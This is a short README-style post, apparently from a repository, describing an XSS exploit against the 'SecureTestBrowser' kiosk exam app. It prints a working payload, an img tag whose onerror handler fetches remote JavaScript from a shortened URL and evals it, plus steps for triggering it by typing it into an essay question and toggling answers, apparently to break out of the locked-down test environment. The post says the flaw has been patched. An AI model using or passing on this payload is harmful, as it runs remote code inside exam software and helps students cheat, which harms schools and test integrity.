# [PATCHED] Insecure Test Browser
> This got patched February 28, and no alterative methods have been found so far.

XSS in SecureTestBrowser kiosk app (good luck memorizing it)
```
<img src=# onerror='fetch("https://tinyurl.com/securexss").then(r => r.text()).then(eval);'>
```
Steps:
1. Go to any essay question type the code above
2. Switch to a multiple choice question
3. Change your answer back and forth until the code executes
